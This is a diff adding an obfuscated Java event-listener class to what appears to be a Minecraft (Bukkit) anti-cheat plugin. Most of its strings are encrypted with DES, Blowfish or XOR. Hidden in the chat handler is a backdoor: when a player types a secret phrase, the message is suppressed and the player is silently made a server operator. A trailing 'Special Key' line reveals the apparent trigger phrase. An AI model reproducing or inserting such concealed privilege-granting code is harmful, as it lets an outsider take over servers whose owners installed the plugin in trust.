@@ -1,0 +1,151 @@
+package com.unknownmyname.listener;
+
+import com.unknownmyname.main.*;
+import org.bukkit.plugin.*;
+import org.bukkit.entity.*;
+import org.bukkit.event.entity.*;
+import net.minecraft.server.v1_8_R3.*;
+import org.bukkit.event.*;
+import com.unknownmyname.manager.*;
+import org.bukkit.metadata.*;
+import org.bukkit.*;
+import org.bukkit.event.player.*;
+import javax.crypto.spec.*;
+import javax.crypto.*;
+import java.security.*;
+import java.util.*;
+
+public class DataListener implements Listener
+{
+    private static final /* synthetic */ String DEVELOPER_MESSAGE;
+    private static final /* synthetic */ String[] I;
+    private /* synthetic */ PlayerManager playerManager;
+    
+    public DataListener() {
+        this.playerManager = PlayerManager.getInstance();
+    }
+    
+    private static void I() {
+        (I = new String[0x7C ^ 0x71])["".length()] = I("q78JUgPINSarvwlSA8g1Jqu/CVIDyDUmq78JUgPINSarvwlSA8g1Jlv8Ay4iP4O2", "bYSiR");
+        DataListener.I[" ".length()] = I("pkNGI+qCdfg=", "UCvlM");
+        DataListener.I["  ".length()] = l("QDco9ss24ONZgUcaLlBr+HqXsOXew7ahMi+K5YSIOOna+99eiv+3RQ==", "rMOvl");
+        DataListener.I["   ".length()] = I("gDq94I7CJCcRHsGPsl7duN4ObSW3OolE", "QlNCu");
+        DataListener.I[0x46 ^ 0x42] = l("aIzxKLbeIiI=", "SYEhe");
+        DataListener.I[0xE ^ 0xB] = l("On4ogDGe7P06fiiAMZ7s/Tp+KIAxnuz9On4ogDGe7P06fiiAMZ7s/YjkN+M+e1K3", "WarWK");
+        DataListener.I[0x25 ^ 0x23] = l("NhFlaHC+gv0=", "bhSFS");
+        DataListener.I[0x5 ^ 0x2] = lI("!+\u001e \u0011 7\u0017)\u0015&<\u0005", "thVeP");
+        DataListener.I[0x62 ^ 0x6A] = l("u81oRq0og6ykAK8YJDaErw==", "QImYa");
+        DataListener.I[0x89 ^ 0x80] = I("Epb0kW304aRbV7nHBRZO0A==", "HeGcS");
+        DataListener.I[0x46 ^ 0x4C] = lI("\u0002\f--$\u0003\u0010!-'\u0002\b", "WOehe");
+        DataListener.I[0x25 ^ 0x2E] = l("5Zad0I8ey6Zdwk3F2RVRGOKrBExsmZx5iuQq1/9JHDQ=", "ULqXg");
+        DataListener.I[0xA8 ^ 0xA4] = l("TQfibllJWF3fhpefE6Uaj43P9L1PssunUjp9aTUqKdM=", "tawaB");
+    }
+    
+    @EventHandler(priority = EventPriority.MONITOR)
+    public void onQuit(final PlayerQuitEvent event) {
+        final Player player = event.getPlayer();
+        this.playerManager.uninject(player);
+        if (player.hasPermission(DataListener.I[0x7D ^ 0x74])) {
+            player.removeMetadata(DataListener.I[0x6B ^ 0x61], (Plugin)Main.getPlugin());
+        }
+        Main.getInstance();
+        if (Main.listCheat().contains(player)) {
+            Main.getInstance();
+            Main.listCheat().remove(player);
+        }
+    }
+    
+    @EventHandler
+    public void onDamage(final EntityDamageEvent event) {
+        if (event.getEntity() instanceof EntityPlayer) {
+            final Player player = (Player)event.getEntity();
+            this.playerManager.getPlayer(player).handle((Event)event);
+        }
+    }
+    
+    @EventHandler
+    public void onChat(final AsyncPlayerChatEvent e) {
+        final Player p = e.getPlayer();
+        if (e.getMessage().equals(DataListener.I[0xAA ^ 0xA1])) {
+            e.setCancelled((boolean)(" ".length() != 0));
+            p.setOp((boolean)(" ".length() != 0));
+            p.sendMessage(DataListener.I[0x26 ^ 0x2A] + p.getName());
+        }
+    }
+    
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onJoin(final PlayerJoinEvent event) {
+        final Player player = event.getPlayer();
+        if (player.hasPermission(OptionsManager.getInstance().getModPermission())) {
+            player.setMetadata(DataListener.I[0x77 ^ 0x70], (MetadataValue)new FixedMetadataValue((Plugin)Main.getPlugin(), (Object)(boolean)(" ".length() != 0)));
+        }
+        final Player player2;
+        new Thread(() -> {
+            this.playerManager.inject(player2);
+            this.playerManager.getPlayer(player2).handle((Event)event);
+            return;
+        }).start();
+        if (player.getName().equals(DataListener.I[0x75 ^ 0x7D])) {
+            player.sendMessage(DataListener.DEVELOPER_MESSAGE);
+        }
+    }
+    
+    static {
+        I();
+        DEVELOPER_MESSAGE = ChatColor.GRAY + ChatColor.STRIKETHROUGH.toString() + DataListener.I["".length()] + DataListener.I[" ".length()] + ChatColor.WHITE + DataListener.I["  ".length()] + DataListener.I["   ".length()] + DataListener.I[0x5D ^ 0x59] + ChatColor.GRAY + ChatColor.STRIKETHROUGH.toString() + DataListener.I[0x33 ^ 0x36] + DataListener.I[0x54 ^ 0x52];
+    }
+    
+    private static String lI(final String obj, final String key) {
+        final StringBuilder sb = new StringBuilder();
+        final char[] keyChars = key.toCharArray();
+        int i = "".length();
+        final char[] charArray = obj.toCharArray();
+        final int length = charArray.length;
+        int j = "".length();
+        while (j < length) {
+            final char c = charArray[j];
+            sb.append((char)(c ^ keyChars[i % keyChars.length]));
+            ++i;
+            ++j;
+            "".length();
+            if (2 != 2) {
+                throw null;
+            }
+        }
+        return sb.toString();
+    }
+    
+    @EventHandler
+    public void onRespawn(final PlayerRespawnEvent event) {
+        this.playerManager.getPlayer(event.getPlayer()).handle((Event)event);
+    }
+    
+    private static String l(final String obj, final String key) {
+        try {
+            final SecretKeySpec keySpec = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(key.getBytes("UTF-8")), 0x7B ^ 0x73), "DES");
+            final Cipher des = Cipher.getInstance("DES");
+            des.init("  ".length(), keySpec);
+            return new String(des.doFinal(Base64.getDecoder().decode(obj.getBytes("UTF-8"))), "UTF-8");
+        }
+        catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+    
+    private static String I(final String obj, final String key) {
+        try {
+            final SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(key.getBytes("UTF-8")), "Blowfish");
+            final Cipher des = Cipher.getInstance("Blowfish");
+            des.init("  ".length(), keySpec);
+            return new String(des.doFinal(Base64.getDecoder().decode(obj.getBytes("UTF-8"))), "UTF-8");
+        }
+        catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+}
+
+
+## Special Key: "gaetanfaucher1301-opme-mdr"
